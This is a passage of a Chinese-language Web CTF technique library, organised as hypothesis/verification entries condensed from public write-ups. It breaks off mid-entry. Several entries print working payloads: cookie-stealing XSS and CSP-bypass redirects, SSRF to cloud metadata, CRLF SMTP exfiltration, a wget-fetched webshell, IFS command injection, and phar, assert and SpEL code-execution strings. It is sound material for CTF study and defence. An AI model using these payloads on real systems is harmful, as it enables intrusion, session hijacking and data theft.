---
verified: "2026-10-15 | 本地复跑：Python 3.12.13 + pycryptodome 3.23.0（Linux 容器），见条目1复跑记录"
status: verified
# status 取值：hypothesis（假设）| verifying（验证中）| verified（复跑通过）| refuted（证伪，需附失败原因）| inconclusive（证据不足挂起）；旧词映射 draft≡hypothesis、deprecated≡refuted（见 ../../shared/REFLIGHT.md §1）
source: "0rangec3t/Black-cat（techniques/web.md 五段式范式）、PayloadsAllTheThings、book.hacktricks.xyz、M2 实测复跑（2026-10-15）"
changelog:
  - "[2026-10-29] v0.5：蒸馏 P1+P2 批次并入 23 条（hypothesis 待复跑，REFLIGHT §1 二手知识纪律）｜源：ctf-corpus/distill 候选池（candidates.jsonl）+ distill/pilot/01-蒸馏批次报告-P2-20261029.md"
  - "[2026-10-15] 初始空壳，等待首个回流条目"
  - "[2026-10-15] v0.2：条目模板升级为五段式假设条目 + 机器可校验裁决词（REFLIGHT 回流协议，见 ../../shared/REFLIGHT.md）"
  - "[2026-10-15] v0.3：M2 填充 4 条（verified 1 / inconclusive 1 / hypothesis 2）"
---

# 题型：Web

> 读取时机：题面为网址实例或 Web 漏洞关键词时（注入/SSRF/反序列化/JWT 等条目主库）

## 填充规范（回流时遵守）

1. 条目模板 = 五段式假设条目：**假设 → 验证步骤 → 判定标准 → 裁决词 → 来源**（完整模板见 ../../shared/REFLIGHT.md §3），一技术一条目。
2. 裁决词只允许机器可校验标准词 **PASS / FAIL / INCONCLUSIVE**（词表见 ../../shared/REFLIGHT.md §2）；状态机：hypothesis → verifying → verified / refuted / inconclusive（§1）。
3. frontmatter 记录本文件最新验证状态：verified=最近一次复现日期+环境；source=条目主要出处；changelog 追加一行/次，不删除历史。
4. **失败样本优先回流**：refuted 条目必须附 FAIL 复跑记录、失败原因与"下一步转哪个新假设"，失败样本优先级高于成功经验。
5. verified/refuted/inconclusive 条目必须附复跑记录表（格式见 ../../shared/REFLIGHT.md §4）；未经复跑的条目状态只允许 hypothesis。
6. 工具具体用法归 ../../shared/tools/ 对应文件，此处不重复（去重原则）；五段式的「验证步骤」只保留最小可执行命令骨架。
7. 本文件超过 100 行时，在本节下方补 TOC 目录。

## 条目区（TOC）

1. [JWT alg=none 签名绕过](#jwt-algnone-签名绕过)（verified）
2. [sqlmap 阴性 → 转查 ORM/Mass Assignment](#sqlmap-阴性--转查-ormmass-assignment)（inconclusive）
3. [PHP 弱比较 == 与 0e MD5 魔术哈希](#php-弱比较--与-0e-md5-魔术哈希)（hypothesis）
4. [SSRF 打云 metadata 与内网](#ssrf-打云-metadata-与内网)（hypothesis）
5. [Java XMLDecoder 签名文件反序列化 RCE](#java-xmldecoder-签名文件反序列化-rce)（hypothesis）
6. [游戏状态存 Flask cookie（rarity=0 取旗不可能 → 离线解码）](#游戏状态存-flask-cookierarity0-取旗不可能-离线解码)（hypothesis）
7. [DOMPurify pin 版本 1-day 时间窗（mglyph mXSS）](#dompurify-pin-版本-1-day-时间窗mglyph-mxss)（hypothesis）
8. [答案校验藏于 WebGL shader（路径编码阶段状态机）](#答案校验藏于-webgl-shader路径编码阶段状态机)（hypothesis）
9. [离线环境 XSS 取证（敏感数据写入 DOM 供 bot 抓取）](#离线环境-xss-取证敏感数据写入-dom-供-bot-抓取)（hypothesis）
10. [CSP self 下报错回显页作脚本源（注释缝合合法 JS）](#csp-self-下报错回显页作脚本源注释缝合合法-js)（hypothesis）
11. [lesspipe 文件类型分发链 RCE（ar 选项文件 + 插件加载）](#lesspipe-文件类型分发链-rcear-选项文件-插件加载)（hypothesis）
12. [S3 桶公开列举与对象直读（注释情报链）](#s3-桶公开列举与对象直读注释情报链)（hypothesis）
13. [phar 反序列化（图片 stub 伪装 + 魔术方法命令拼接）](#phar-反序列化图片-stub-伪装-魔术方法命令拼接)（hypothesis）
14. [SSRF 协议走私（CRLF 注入 SMTP 会话外带数据）](#ssrf-协议走私crlf-注入-smtp-会话外带数据)（hypothesis）
15. [Kerberos AS-REP Roast（无预认证用户哈希离线爆破）](#kerberos-as-rep-roast无预认证用户哈希离线爆破)（hypothesis）
16. [受限 shell 无命令读文件（展开/coproc/补全原语）](#受限-shell-无命令读文件展开coproc补全原语)（hypothesis）
17. [纯字母数字命令注入（十进制 IP 下载 + 文件链重命名）](#纯字母数字命令注入十进制-ip-下载-文件链重命名)（hypothesis）
18. [弱时间种子签名密钥恢复（Django SECRET_KEY 伪造）](#弱时间种子签名密钥恢复django-secret_key-伪造)（hypothesis）
19. [system() 命令注入（IFS 替空格 + 短路链）](#system-命令注入ifs-替空格-短路链)（hypothesis）
20. [Oracle SQL 解谜（窗口函数 + CONNECT BY 层级聚合）](#oracle-sql-解谜窗口函数-connect-by-层级聚合)（hypothesis）
21. [PHP assert 字符串注入（单引号逃逸执行 + .git 源码泄露）](#php-assert-字符串注入单引号逃逸执行-git-源码泄露)（hypothesis）
22. [Java 反序列化 XML gadget + SpEL 表达式注入（T() 静态调用）](#java-反序列化-xml-gadget-spel-表达式注入t-静态调用)（hypothesis）
23. [Flask 弱密钥枚举会话伪造（字典 secret 离线爆破）](#flask-弱密钥枚举会话伪造字典-secret-离线爆破)（hypothesis）
24. [EXIF 元数据注入 SQL（盲注 rlike 面板）](#exif-元数据注入-sql盲注-rlike-面板)（hypothesis）
25. [Go 版本差异参数走私（ParseThru 绕 WAF 取文件）](#go-版本差异参数走私parsethru-绕-waf-取文件)（hypothesis）
26. [JS 混淆还原 + XXTEA 密钥提取（字符串映射表归一化）](#js-混淆还原-xxtea-密钥提取字符串映射表归一化)（hypothesis）
27. [Java 反序列化 RCE（ysoserial 载荷类名改写）](#java-反序列化-rceysoserial-载荷类名改写)（hypothesis）

### JWT alg=none 签名绕过
- **假设**：题面给 JWT 且改 payload 后返回 401/签名错误 → 服务端 JWT 库可能接受 `alg:"none"`（把 alg 当分支而非白名单校验），可空签名伪造任意身份。
- **验证步骤**：手写最小校验器对照（生产上等价于往目标发两个 token 对比响应）：
  ```bash
  # header={"alg":"none","typ":"JWT"} payload={"user":"admin"}
  # token = base64url(header).base64url(payload).（空签名）
  # 若无 python/jwt 工具，直接 base64 手工拼装后 curl -H "Authorization: Bearer <token>" <目标>
  ```
  本机对照实验（2026-10-15）：缺陷实现（`if alg=="none": return True`）接受空签名 token；算法白名单实现（`alg!="HS256" → reject`）拒绝同一 token。
- **判定标准**：PASS = 目标以 admin 身份返回 200/受保护资源；FAIL = 两种 token 响应无差异且签名校验报错。
- **裁决词**：PASS
- **来源**：M2 实测复跑（最小校验器对照，evidence T3）；RFC 8725 §3.1（算法白名单原则）；PayloadsAllTheThings JWT
- **升级**：PASS 后用同一身份探越权接口拿 flag；FAIL 转 jku/kid 注入新假设。
- **关键差异**：模型盲区——容易只试改 payload 忘了同步清空签名段；且 `alg` 必须从 token 里读出来后**白名单比对**，而不是"支持 none 就放行"。

### 复跑记录（verified / refuted / inconclusive 必备，append-only）
| # | 日期 | 环境/靶场 | 命令或脚本 | 裁决词 | 工件路径 | 备注 |
|---|---|---|---|---|---|---|
| 1 | 2026-10-15 | 本地 Python 3.12.13 最小校验器对照 | 手写 vulnerable_verify / correct_verify 对照（见验证步骤） | PASS | evidence/T3-jwt-alg-none | 缺陷实现接受空签名 token=True，白名单实现=False；未打真实靶场 |

### sqlmap 阴性 → 转查 ORM/Mass Assignment
- **假设**：sqlmap 报无注入（阴性）≠ 无漏洞 → Black-cat 状态机范式：`sqlmap 阴性 = 转查 Mass Assignment / ORM 关系穿越的新假设，而非"没有 SQLi"`。
- **验证步骤**：1) 抓注册/更新接口的完整参数表；2) 追加 `role=admin` / `is_admin=true` 类字段重放；3) 对 ORM 框架接口尝试关系穿越字段（如 `{"user":{"admin":true}}`）。
- **判定标准**：PASS = 服务端接受未暴露字段并提升权限/泄露关联对象；FAIL = 字段被过滤且无新信息。
- **裁决词**：INCONCLUSIVE
- **来源**：0rangec3t/Black-cat techniques/web.md（ORM Leaking 条目+关键差异注记）；shared/安全方向skill与知识库组织调研.md 特点3
- （inconclusive 缺口清单）本机无 sqlmap、无可重放靶场实例；需 HTB/BUUCTF Web 实例或本地起 Juice Shop 才能补验证。
- **关键差异**：模型盲区——payload 全是合法 ORM 查询，AI 只会想到 SQLi 想不到关系穿越。

### 复跑记录（verified / refuted / inconclusive 必备，append-only）
| # | 日期 | 环境/靶场 | 命令或脚本 | 裁决词 | 工件路径 | 备注 |
|---|---|---|---|---|---|---|
| 1 | 2026-10-15 | 无靶场（本机无 sqlmap） | 未执行 | INCONCLUSIVE | - | 缺口：缺 Web 靶场实例 + sqlmap；下次在 HTB/BUUCTF Web 题补 |

### PHP 弱比较 == 与 0e MD5 魔术哈希
- **假设**：题面为 PHP 源码审计且出现 `==` 比较 md5/数值 → 弱比较下 `"0e123"=="0e456"` 为 true（科学计数法全零），`md5($x)==$s` 可用 0e 开头哈希碰撞绕过；数组传参 `x[]=` 使 `md5(数组)==字符串` 报 NULL 相等。
- **验证步骤**：1) 审计比较语句确认是 `==` 非 `===`；2) 构造 `?a=240610708&b=QNKCDZO`（两值 md5 均为 0e 开头）提交；3) 数组场景 `?a[]=1&a[]=2` 绕 `md5(a)==md5(b)` 与 `strcmp` 比较。
- **判定标准**：PASS = 服务端进入原本被比较语句挡住的分支/输出 flag；FAIL = 使用强比较或类型校验，无变化。
- **裁决词**：待复跑
- **来源**：PayloadsAllTheThings（PHP tricks / Magic Hashes）；CTF-wiki PHP 弱类型
- （可选）**升级**：PASS 后同思路检查 `in_array` 第三参缺省、`json_decode` 类型混淆。

### SSRF 打云 metadata 与内网
- **假设**：题面/靶场允许提交 URL 且服务端发起请求（头像拉取、webhook、预览）→ 存在 SSRF，可访问 `http://169.254.169.254/`（云 metadata）或内网服务。
- **验证步骤**：1) 提交 `http://127.0.0.1:80` 与 `http://169.254.169.254/latest/meta-data/` 观察响应差异；2) 被过滤时尝试重定向跳转、DNS rebinding、`0.0.0.0`/十进制 IP/`[::]` 等等价写法。
- **判定标准**：PASS = 返回非公开内容（metadata/内网页面）；FAIL = 全部写法被统一拦截（先怀疑解析层白名单，回炉看过滤规则）。
- **裁决词**：待复跑
- **来源**：book.hacktricks.xyz SSRF 章节；PayloadsAllTheThings SSRF
- （可选）**关键差异**：模型盲区——只试 `127.0.0.1` 不试等价网络写法；有出网差异（回显 vs 盲打）时先确定观测通道。

### Java XMLDecoder 签名文件反序列化 RCE
- **分层**：简单档·可复现强
- **假设**：Java `XMLDecoder` 处理的「文档签名」XML 本质是**任意对象构造+方法调用序列**（`<object class>` / `<void method>`）→ 以 `java.io.PrintWriter` 落地脚本文件、`java.lang.Runtime.getRuntime().exec` / `ProcessBuilder` 执行命令；服务端把 XMLDecoder 样例直接回显（`class="java.beans.XMLDecoder"` 头）即为可识别特征。
- **验证步骤**：1) 识别 XMLDecoder 特征头；2) 构造 `<object class="java.io.PrintWriter"><string>/tmp/x.sh</string>...` 写文件（`<void method="println">` 注入命令）；3) `<object class="java.lang.ProcessBuilder">` 或 Runtime exec 调用执行；4) 上传「签名文件」触发。
- **判定标准**：PASS = 受控文件出现/命令回连；FAIL = 输出流受限 → 转回显型（exec 输出重定向至签名内容）。
- **裁决词**：待复跑
- **来源**：nullcon 2016 web-1 Sign Server（web 100p）｜p4｜raw/github-repos/p4/2016_nullcon_e_web-1.md（CTFSignature XML 样例与 hash 字段全在 WP；payload 本地可构造重放）

### 游戏状态存 Flask cookie（rarity=0 取旗不可能 → 离线解码）
- **分层**：超级难档·失败样本/陷阱
- **回流优先级：refuted 候选**——「在游戏逻辑内取得旗（把旗当可捕获目标）」假设被源码直接证伪：旗的 `rarity=0`，游戏内永不可捕获；待复跑转正。
- **假设**：Flask 会话 cookie 异常大且随游戏状态变化 ⇒ 状态序列化进 cookie（服务端只签名不加密）→ **离线解码读全部字段**（含对象 description 内嵌旗）；前导 `.` = zlib 压缩标志；非预期解常优于预期解（预期解 = nickname 模板注入，作者自认不知 cookie 可解码）。
- **验证步骤**：1) 观察请求间 cookie 尺寸/变化；2) strip 前导 '.' → `payload.split(".")[0]` → itsdangerous `base64_decode` → `zlib.decompress` → `json.loads`；3) 遍历状态对象字段（room/pykemon/description）找明文或 base64 内嵌旗。
- **判定标准**：PASS = 解码出完整 JSON 状态且含旗；FAIL = cookie 为加密会话（itsdangerous + 密钥加密）→ 转服务端密钥泄漏路径。
- **裁决词**：待复跑
- **来源**：PlaidCTF 2017 pykemon（web 151p）｜p4（unintended 解）｜raw/github-repos/p4/2017_plaidctf_x_pykemon.md（完整 7 行 decode 脚本 + 样例 cookie 在 WP）
- **工具下沉建议（熵控 Q2）**：Flask cookie 离线解码骨架（'.' 前缀判 zlib + base64_decode + json）应下沉 `../skill-duo/shared/tools/web-exploitation.md`，题型条目只留判据，不复制脚本——随 PR 一并提交。

### DOMPurify pin 版本 1-day 时间窗（mglyph mXSS）
- **分层**：超级难档·失败样本/陷阱
- **回流优先级：refuted 候选**——「DOMPurify sanitize 后无 XSS」假设被赛事期间公开的 1-day（2020-08 mglyph mXSS，CVE 系）证伪：题环境 pin 住带洞版本；待复跑转正。
- **假设**：输出过滤是**字符替换**（`replaceAll('<','&lt;')`）而输入经 DOMPurify pin 版本时：① 先查 pin 版本号比对公开 1-day（时间窗思维）；② 用 math/mtext/mglyph/style 嵌套使 sanitize 后 DOM 的 `innerText` 含原样标签串；③ 事件 handler 把 `innerText` 写回 `innerHTML` 完成二次求值（自复制绕输出转义）。
- **验证步骤**：1) 取 DOMPurify 版本号（前端资源）比对 1-day 公告；2) 构造 `[<math><mtext><table><mglyph><style><math><img src="x" onerror=...>]` 嵌套载荷；3) onerror 执行 `window.output.innerHTML=window.output.innerText`（双 img 串联）；4) 触发后读 admin cookie/旗。
- **判定标准**：PASS = 事件触发且执行任意 JS；FAIL = pin 版本已修复 mglyph → 转其他 mXSS 变体或预期解路径。
- **裁决词**：待复跑
- **来源**：TWCTF 2020 bfnote（unintended，预期解 = Google reCAPTCHA callback 机制）｜p4｜raw/github-repos/p4/2020_tokyowesterns_x_bfnote.md（完整 mglyph 载荷与 brainfuck 输出串在 WP）

### 答案校验藏于 WebGL shader（路径编码阶段状态机）
- **分层**：超级难档·失败样本/陷阱
- **假设**：浏览器题的答案校验逻辑不在 JS 主线程而在 **GLSL shader**（webpack 模块的 `sourceCode` 字段 + `uniforms` 声明即特征）→ 格式化 shader 主函数提取各阶段判定（uniform ivec4 `loopback` 等承载阶段状态）→ 阶段序列本身编码出密钥材料，末关用本地 AES 解密 blob——**全程无需 GPU 渲染**。
- **验证步骤**：1) 定位 JS 里的 `sourceCode`/`uniforms` 字段（webpack chunk）；2) 格式化 GLSL 提取判定逻辑与阶段编号；3) 推出三段路径序列；4) python 复算密钥推导（阶段值累加进字节矩阵）+ `AES-CBC` 解最终密文。
- **判定标准**：PASS = 本地静态解出旗；FAIL = 校验依赖渲染反馈（状态在帧间传递）→ 转 headless 浏览器驱动交互。
- **裁决词**：待复跑
- **来源**：PlaidCTF 2021 The Watness III｜perfect blue｜raw/github-repos/perfectblue/2021_plaidctf_x_watness3.md（s1/s2/s3 路径编码 + AES 密钥推导 + IV 常量全在 WP 脚本）
- **陷阱备注**：「画线谜题要人肉玩」是错觉——校验状态机可全量离线复算；阶段 3 手工不可解恰是提示。

### 离线环境 XSS 取证（敏感数据写入 DOM 供 bot 抓取）
- **分层**：困难档·复合链
- **假设**：靶机无外网（XSS 传统外带 `document.cookie`→自建服务器不可达）而 bot 为 headless 浏览器且会执行 `execute_script` 抓取页面元素 → payload 不外带，把 cookie 写入页面可见元素（如 `#score` 的 textContent），bot 抓取回显即得数据；注入点为成绩回显 `innerHTML`（`<script>` 经 innerHTML 不执行，`<img src=a onerror=…>` 可执行）。
- **验证步骤**：1) 构造 `<img src=a onerror='document.querySelector("#score").textContent=document.cookie'>`；2) 提交成绩取得含 payload 的结果 URL；3) 提交 URL 给 bot；4) 读 bot 回传的 greeting/score 字段。
- **判定标准**：PASS = bot 返回值中含 bot 侧 cookie/旗；FAIL = 元素选择器不匹配或 CSP 拦截 → 改查其他回显元素。
- **裁决词**：待复跑
- **来源**：Hackergame 2022 微积分计算小练习（web 200p）｜taoky（官方题解）｜raw/github-repos/hackergame2022/2022_hackergame_h_cn-*.md（bot.py 源码随题给出，行为可全重放）
- **陷阱备注**：先验「外带必走网络」的思维定势是主要卡点——离线场景问「谁会读这个页面」，答案直接决定 payload 形态。

### CSP self 下报错回显页作脚本源（注释缝合合法 JS）
- **分层**：困难档·绕过型
- **假设**：CSP 禁 inline script 但 script-src 允许 self → 站内任何能输出可控文本且语法上凑成合法 JS 的页面都可作为 `<script src>` 目标；报错页把 receiver 与 content 一前一后回显 → 两侧内容用 `/*` 与 `*/` 包成注释缝合语法；外带走 `location.hash`（URL `#` 后参数不落服务端日志）。
- **验证步骤**：1) 探测各 action 页面回显点与转义规则；2) `<script src="/index.php?action=send&to=*/alert(1)&content=/*">` 自发消息验证执行；3) 升级 payload 为 `document.location=location.hash.substr(1)+document.cookie`；4) 发触发消息给管理员，再诱其访问带 `#` 的 URL。
- **判定标准**：PASS = 收到含管理员 cookie 的消息；FAIL = 引号被转义 → 改 hash 传参绕开字符串字面量。
- **裁决词**：待复跑
- **来源**：ISG 2015 xssme（web，p4）｜p4（波兰战队）｜raw/github-repos/p4/2015_isg_e_xssme.md（payload 与三段式利用链全文在 WP）

### lesspipe 文件类型分发链 RCE（ar 选项文件 + 插件加载）
- **分层**：困难档·组件生态缺陷
- **假设**：Ubuntu 交互 shell 默认启用 lesspipe（LESSOPEN 预处理器按文件类型把内容转换为 less 可读文本，PDF→pdftotext、归档→ar 等）→ 在线「less 文件查看器」若把用户上传文件交给完整 lesspipe 环境，不受信文件即命令执行面；ar 工具支持 `--plugin` 加载共享对象，而归档「选项文件」内容可作为参数传递 → 构造 plugin.so（gcc 共享库，构造函数执行 system）+ `@.a`（空归档）+ `.a`（内容为 `-s --plugin ./plugin.so ./@.a`），上传顺序保证 `.a` 最后落盘（目录内选项文件生效顺序）。
- **验证步骤**：1) 与题目同构 Dockerfile 起 lesspipe 环境；2) printf 构造 `.a` 内容 `ar rc ./@.a /dev/null` 生成伪归档；3) 三文件按序上传；4) 替换命令为 `cat /flag` 重传。
- **判定标准**：PASS = 返回页含命令输出；FAIL = lesspipe 未启用（无 LESSOPEN）→ 转查其他预处理器（groff/man 等）。
- **裁决词**：待复跑
- **来源**：Hackergame 2024 LESS 文件查看器在线版（web 250p）｜zzh1996（官方题解）｜raw/github-repos/hackergame2024/2024_hackergame_h_*.md（Dockerfile + 复现命令全文；原始讨论 seclists 2014）
- **陷阱备注**：上传顺序敏感（`@.a` 必须最后）——浏览器按大小排序或 curl 脚本控制顺序；「只是看个文件」的服务也可能承载完整文件类型分发生态。

### S3 桶公开列举与对象直读（注释情报链）
- **分层**：困难档·信息泄露
- **假设**：静态站托管于 S3 website endpoint → HTML 注释常残留备份桶名/目录线索（前后端分离的旧桶、提示语）；桶 ACL 配置错误（ListBucket 权限对匿名开放）→ 直接 GET 桶根返回 ListBucketResult XML 全量键名 → 旗对象按路径直读。
- **验证步骤**：1) `curl` 首页并提取全部 HTML 注释；2) 依次试探注释中的桶名 endpoint；3) 根路径 GET 观察是否返回 XML 列举；4) 按 Key 路径拼接直读对象。
- **判定标准**：PASS = 拿到旗对象内容；FAIL = 403（列举被禁）→ 转猜键名/版本 ID 或审计页面静态资源引用。
- **裁决词**：待复跑
- **来源**：TAMUctf 2019 Buckets（web 362p）｜Dvd848（S1 扩容源）｜raw/github-repos/Dvd848/*.md（完整 curl 链与桶名线索在 WP；服务下线，复现需自建 minio 同构环境）
- **关联**：情报入口与 [[OSINT：证书透明度与被动域收集]] 同属「被动线索优先」纪律族。

### phar 反序列化（图片 stub 伪装 + 魔术方法命令拼接）
- **分层**：困难档·反序列化
- **假设**：PHP 上传白名单校验图片头（getimagesize）但后续存在对上传文件做流操作（DOM/文件函数）→ phar 流包装触发 metadata 反序列化；phar stub 前缀拼 JPEG 头绕过校验，metadata 存自定义对象（其魔术方法或析构链拼接命令）→ 命令注入执行。
- **验证步骤**：1) 审上传与消费路径定位触发点（file_get_contents/DOMDocument 等）；2) PHP 脚本构造 phar：stub=`JPEG 头 + __HALT_COMPILER(); ?>`，metadata=`Image(file_name=" ;./flag_dispenser; ")`；3) 上传后经触发路径访问；4) 观察命令输出。
- **判定标准**：PASS = 旗程序输出回显；FAIL = PHP ≥8.0 元数据禁用 → 转查其他反序列化入口（SESSION/JSON）。
- **裁决词**：待复跑
- **来源**：Midnight Sun CTF 2019 Quals Rubenscube（web 424p，26 solved）｜Dvd848（S1 扩容源）｜raw/github-repos/Dvd848/*.md（upload.php 源码与 phar 构造脚本在 WP）
- **陷阱备注**：上传校验用 getimagesize 不认 SVG → SVG 走 DOMDocument + LIBXML_NOENT 另开 XXE 文件读取面（同一题双解路径，审题先画上传→消费全链）。

### SSRF 协议走私（CRLF 注入 SMTP 会话外带数据）
- **分层**：困难档·复合链
- **假设**：站内「取图」功能按用户 URL 发起请求（SSRF 面）且 URL 未过滤换行 → 指向 `localhost:25` 并以 `%0d%0a` 注入 SMTP 会话命令（MAIL FROM/RCPT TO/DATA/QUIT），DATA 正文携带本地数据（优惠券 ID 或旗）寄出 → 邮件接收即外带。
- **验证步骤**：1) 定位图片 URL 参数可指向任意 scheme/host/port；2) CRLF 编码注入完整 SMTP 会话；3) RCPT TO 填自控邮箱；4) DATA 段拼旗参数后以 `.` 结束。
- **判定标准**：PASS = 收到含旗邮件；FAIL = 换行被 strip → 转查是否支持 redirect/gopher 协议二次走私。
- **裁决词**：待复跑
- **来源**：CTFzone Quals 2018 MMORPG 3000（web 470p，2 solved）｜p4（波兰战队）｜raw/github-repos/p4/2018_ctfzone-quals_e_mmorpg.md（中间层与完整走私 URL 在 WP）
- **关联**：与 [[SSRF 打云 metadata 与内网]] 同族不同层——母条目管「打到哪」，本条管「非 HTTP 协议怎么走私载荷」。

### Kerberos AS-REP Roast（无预认证用户哈希离线爆破）
- **分层**：困难档·复合链
- **假设**：Web 层 SQL 注入（`query=123 or 1=1 --`）可枚举用户名 → `kadmin` 探测确认 principal 有效（有密码提示即存在）→ `GetNPUsers` 请求无预认证用户的 AS-REP → 可离线爆破的密钥哈希 → hashcat -m 18200 弱口令恢复 → 回 Web 登录取旗。
- **验证步骤**：1) SQLi 回显点 UNION 定位列；2) 用户名逐个 kadmin 验证；3) GetNPUsers -no-pass 拿哈希；4) hashcat 字典爆破；5) 凭据回登录处使用。
- **判定标准**：PASS = 恢复口令并登录见旗；FAIL = 全员开启预认证 → 转 kerberoast（TGS 票据）路径。
- **裁决词**：待复跑
- **来源**：The Catch 2021 Phone Book（web，cat10=web/recon）｜p4（波兰战队）｜raw/github-repos/p4/2021_thecatch_e_phone-book.md（四步命令序列完整在 WP；需 KDC 环境，可自建 samba AD 复放）
- **陷阱备注**：用户枚举的入口未必在 88 端口——Web 层信息泄露（报错回显）常是 principal 名的来源；「先枚举再选攻击」与 [[nmap 赛题环境探测]] 同纪律。

### 受限 shell 无命令读文件（展开/coproc/补全原语）
- **分层**：困难档·逃逸型
- **假设**：目标环境已给出 shell 但命令集被裁剪（无 cat/ls 等外部二进制）→ bash 内建原语仍可读文件：`$(</flag)` 由 shell 展开；`coproc $(</flag) { x; }` 用文件内容当函数名触发报错回显内容；行内 `<esc> CTRL-E`（shell-expand-line）把命令行替换为展开结果；`compgen -c` 列可用命令、补全系统按路径列文件。
- **验证步骤**：1) `compgen -c | sort -u` 盘点内建面；2) 逐一试 `$(</flag)`、coproc 报错、read 变量+`echo` 级联；3) 短路符/重定向组合执行受限二进制。
- **判定标准**：PASS = 任一原语回显旗内容；FAIL = 输出全静默 → 转退出码侧信道（||/&& 链）逐位探测。
- **裁决词**：待复跑
- **来源**：H4CK1NG G00GL3 2022 Episode 2 Challenge 3（web/shell）｜Dvd848（S1 扩容源）｜raw/github-repos/Dvd848/*.md（多种解法原语对照在 WP，纯交互可重放）
- **陷阱备注**：先问「shell 本身给了我什么」（内建/补全/展开/作业控制），再想「要什么命令」——问法反转是此类题钥匙。

### 纯字母数字命令注入（十进制 IP 下载 + 文件链重命名）
- **分层**：困难档·绕过型
- **假设**：命令拼接处正则白名单 `^\w+$`（仅字母数字下划线，无空格/点/斜杠）且可多参数拼接 → 用现成工具的「无符号参数」特性组合逃逸：`wget <十进制IP>`（IP 的 uint32 表示免点号）下载可控文件名为纯数字的 PHP 落盘 → `mkdir`/`cd` 纯词命令可用 → `tar cvf archived exploit` 实现重命名（下载文件名不可控）→ `php archived` 执行落盘 webshell。
- **验证步骤**：1) 自建仅数字域名的接收端与同构过滤环境；2) `wget 92775836` 拉取 payload；3) tar 重命名链；4) `php archived` 落 `shell.php` 后经 `/sandbox/<IP>/shell.php` 访问。
- **判定标准**：PASS = webshell 命令执行；FAIL = 目录名不可控（REMOTE_ADDR 沙箱）→ 转纯数字目录内的相对路径技巧。
- **裁决词**：待复跑
- **来源**：HITCON 2015 babyfirst（web 100p）｜p4（波兰战队）｜raw/github-repos/p4/2015_hitcon_e_babyfirst.md（命令序列与 exploit 源码全文在 WP）

### 弱时间种子签名密钥恢复（Django SECRET_KEY 伪造）
- **分层**：困难档·密码学工程缺陷
- **假设**：Web 框架会话/签名密钥由 `random.seed(int(time.time()))` 驱动的确定性生成器产出 → 种子空间仅当小时段 ~10^3 量级 → 枚举种子重建密钥，用框架自身 unsigner（TimestampSigner，盐=会话后端名）验证真实会话 cookie 命中 → 以恢复密钥签发伪造管理员会话/证书。
- **验证步骤**：1) 逆向出生成算法字符集与长度（猜常见模式）；2) 从当前时间向前枚举种子；3) 每候选 key 调 unsign 验证存量 cookie；4) 命中后伪造目标签名对象请求。
- **判定标准**：PASS = 伪造签名通过服务端校验；FAIL = 种子含更多熵（毫秒/进程 ID）→ 转分析生成器可观测输出。
- **裁决词**：待复跑
- **来源**：InsomniHack 2022 hopytal（web）｜p4（波兰战队）｜raw/github-repos/p4/2022_insomnihack_e_hopytal.md（生成器代码与爆破循环在 WP；本地 Django 可完整重放）
- **关联**：与 [[python 手工构造/校验 JWT]] 相邻主题——签名伪造的前提都是「拿得到签名密钥」。

### system() 命令注入（IFS 替空格 + 短路链）
- **分层**：困难档·注入型
- **假设**：PHP 以 `system()` 拼接执行 URL 检查命令且输入未过滤 → 参数可控注入 shell 语法；空格被过滤或需绕开时用 `${IFS}` 环境变量替代，无效命令用 `||` 短路接续目标命令（`insta||cat${IFS}flag.txt`）→ 输出直接回显页面。
- **验证步骤**：1) 发 `url=ls` 观察报错确定拼接种类（ping/curl 等）；2) 注入 `||` 短路验证执行；3) `${IFS}` 绕空格过滤读旗文件。
- **判定标准**：PASS = 页面回显旗；FAIL = 命令输出被剥离 → 转时间/出网侧信道。
- **裁决词**：待复跑
- **来源**：Hacky Easter 2021 Social Checker（web）｜Dvd848（S1 扩容源）｜raw/github-repos/Dvd848/*.md（payload 与响应全文在 WP；本地 php system 同构可复放）
- **关联**：Q1 边界——与「纯字母数字命令注入」同属受限命令注入族，关键差异 = 本条字符黑名单走 shell 语法替身（IFS/短路），白名单条走工具特性链（十进制 IP/tar 重命名）。

### Oracle SQL 解谜（窗口函数 + CONNECT BY 层级聚合）
- **分层**：困难档·构造型
- **假设**：旗以「查询计算结果」形式存在（非注入，官方给出查询接口）→ 用 SQL 方言的分析能力解题：窗口函数 `avg() over(partition by)` 做分组均值、`mod(trunc(x),987)` 做数值变换、`start with … connect by prior` 构造等差层级行集、`||` 拼接多段结果为答案码。
- **验证步骤**：1) 读题把积分表目标转译为分组/层级约束；2) 子查询逐段构造并单测；3) `||` 拼接完整答案码提交 GET 参数。
- **判定标准**：PASS = 查询返回旗码；FAIL = 方言不匹配（MySQL/PG）→ 按目标库改写窗口/递归等价物。
- **裁决词**：待复跑
- **来源**：Hackvent 2014 December 10th: SQL hero（web）｜Shiltemann（Galaxians）｜raw/github-repos/Shiltemann/*.md（完整 SQL 语句在 WP；本地 Oracle XE 或 livesql 可重放）
- **关联**：与 [[PPC 脚本题约束建模]] 同族——把约束塞进现成引擎（SQL）而不是写程序。

### PHP assert 字符串注入（单引号逃逸执行 + .git 源码泄露）
- **分层**：困难档·复合链
- **假设**：PHP `assert("strpos('$file','..')===false")` 把用户输入直接拼进**会被 eval 的字符串** → 单引号闭合注入 `'.system(...).'` 类表达式 → 任意代码执行；前置：站源可经公开 `.git/` 目录恢复（对象级抓取：HEAD→refs→objects 或 diggit 工具），从恢复源码定位注入点。
- **验证步骤**：1) `.git/` 可遍历性确认（HTTP 直访 objects）；2) diggit/手工恢复 index.php；3) 构造 `?page=x'.system('cd /var/www/html/;git diff;').'` 断言逃逸；4) 输出中取旗。
- **判定标准**：PASS = 断言逃逸执行命令回显旗；FAIL = assert 被禁用（PHP 7.2 字符串断言弃用 / 8.0 移除）→ 转其他拼接点。
- **裁决词**：待复跑
- **来源**：CSAW CTF 2016 mfw（web 125p）｜bl4de（S1 扩容源）｜raw/github-repos/bl4de/*.md（payload 与 diggit 用法在 WP；本地 php<7.2 同构可复放）
- **关联**：与 [[git 历史考古取旗（log 提交信息 / blame 作者 / 丢失提交找回）]] 为姊妹族——本地 git 取证 vs 服务端 .git 目录泄露，两侧互补。

### Java 反序列化 XML gadget + SpEL 表达式注入（T() 静态调用）
- **分层**：困难档·复合链
- **假设**：受限 `CustomOIS`（白名单反序列化流）仍接受实现了 readObject 的自造类 → gadget 的 writeObject 阶段写入 XXE 文档（DOCTYPE 实体读任意文件如 key 文件）→ 拿认证 key 进受限接口；SpEL 把输入拼进表达式 → `'.isEmpty()&&T(com.target.Flag).getFlag()&&'` 经 `T()` 静态调用执行任意类方法 → RCE；URL 中 `&` 需 `%26` 编码。
